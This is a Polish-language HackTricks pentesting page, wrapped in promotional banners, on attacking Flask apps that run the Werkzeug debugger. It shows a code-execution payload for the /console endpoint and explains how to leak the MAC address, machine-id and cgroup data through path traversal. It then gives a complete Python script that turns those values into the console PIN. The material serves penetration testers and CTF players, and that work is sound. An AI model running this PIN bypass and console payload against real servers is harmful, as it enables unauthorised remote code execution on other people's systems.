# Werkzeug / Flask Debug

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów na GitHubie.**

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Natychmiastowa dostępność konfiguracji do oceny podatności i testowania penetracyjnego**. Uruchom pełny test penetracyjny z dowolnego miejsca za pomocą ponad 20 narzędzi i funkcji, które obejmują rozpoznanie i raportowanie. Nie zastępujemy pentesterów - opracowujemy niestandardowe narzędzia, moduły wykrywania i eksploatacji, aby dać im więcej czasu na dogłębne badania, zdobywanie powłok i dobrą zabawę.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Jeśli debugowanie jest aktywne, możesz spróbować uzyskać dostęp do `/console` i zdobyć RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Istnieje również kilka exploitów w internecie, takich jak [ten](https://github.com/its-arun/Werkzeug-Debug-RCE) lub jeden w metasploicie.

## Pin Protected - Path Traversal

W niektórych przypadkach punkt końcowy **`/console`** będzie chroniony za pomocą pinu. Jeśli masz podatność na **przeszukiwanie plików**, możesz wyciec wszystkie niezbędne informacje do wygenerowania tego pinu.

### Exploit PIN w konsoli Werkzeug

Wymuś stronę błędu debugowania w aplikacji, aby zobaczyć to:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
W przypadku próby dostępu do interfejsu debugowania Werkzeug, napotykane jest powiadomienie o "zablokowanej konsoli", wskazujące na konieczność podania PIN-u w celu odblokowania konsoli. Sugeruje się wykorzystanie podatności PIN-u konsoli poprzez analizę algorytmu generowania PIN-u w pliku inicjalizacyjnym debugowania Werkzeug (`__init__.py`). Mechanizm generowania PIN-u można zbadac w [**repozytorium kodu źródłowego Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), choć zaleca się uzyskanie rzeczywistego kodu serwera za pomocą podatności na przechodzenie plików ze względu na potencjalne rozbieżności wersji.

Aby wykorzystać PIN konsoli, potrzebne są dwa zestawy zmiennych: `probably_public_bits` i `private_bits`:

#### **`probably_public_bits`**
- **`username`**: Odwołuje się do użytkownika, który rozpoczął sesję Flask.
- **`modname`**: Zazwyczaj oznaczany jako `flask.app`.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Zazwyczaj rozwiązuje się do **Flask**.
- **`getattr(mod, '__file__', None)`**: Reprezentuje pełną ścieżkę do `app.py` w katalogu Flask (np. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Jeśli `app.py` nie jest dostępne, **spróbuj `app.pyc`**.

#### **`private_bits`**
- **`uuid.getnode()`**: Pobiera adres MAC bieżącego urządzenia, a `str(uuid.getnode())` przekształca go na format dziesiętny.
- Aby **ustalić adres MAC serwera**, należy zidentyfikować aktywny interfejs sieciowy używany przez aplikację (np. `ens3`). W przypadku niepewności, **wyciek `/proc/net/arp`** pozwala znaleźć identyfikator urządzenia, a następnie **wyodrębnić adres MAC** z **`/sys/class/net/<device id>/address`**.
- Konwersję szesnastkowego adresu MAC na dziesiętny można przeprowadzić jak pokazano poniżej:
```python
# Przykładowy adres MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
- **`get_machine_id()`**: Łączy dane z `/etc/machine-id` lub `/proc/sys/kernel/random/boot_id` z pierwszą linią `/proc/self/cgroup` po ostatnim ukośniku (`/`).

<details>
<summary>Kod dla `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Po zebraniu wszystkich niezbędnych danych, skrypt eksploatacyjny może zostać uruchomiony w celu wygenerowania kodu PIN konsoli Werkzeug:

Po zebraniu wszystkich niezbędnych danych, skrypt eksploatacyjny może zostać uruchomiony w celu wygenerowania kodu PIN konsoli Werkzeug. Skrypt używa zebranych `probably_public_bits` i `private_bits` do utworzenia skrótu, który następnie przechodzi dalszą obróbkę w celu wygenerowania ostatecznego kodu PIN. Poniżej znajduje się kod Pythona do wykonania tego procesu:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ten skrypt generuje PIN poprzez hashowanie skonkatenowanych bitów, dodanie konkretnych soli (`cookiesalt` i `pinsalt`) oraz sformatowanie wyniku. Ważne jest zauważenie, że rzeczywiste wartości dla `probably_public_bits` i `private_bits` muszą być dokładnie pobrane z systemu docelowego, aby upewnić się, że wygenerowany PIN jest zgodny z oczekiwanym przez konsolę Werkzeug.


{% hint style="success" %}
Jeśli używasz **starszej wersji** Werkzeug, spróbuj zmienić **algorytm hashowania na md5** zamiast sha1.
{% endhint %}

## Odwołania

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Natychmiastowe dostępne narzędzia do oceny podatności i testów penetracyjnych**. Uruchom pełny test penetracyjny z dowolnego miejsca za pomocą ponad 20 narzędzi i funkcji, które obejmują od zbierania informacji po raportowanie. Nie zastępujemy testerów penetracyjnych - opracowujemy niestandardowe narzędzia, moduły wykrywania i eksploatacji, aby dać im więcej czasu na głębsze badania, zdobywanie powłok i dobrą zabawę.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
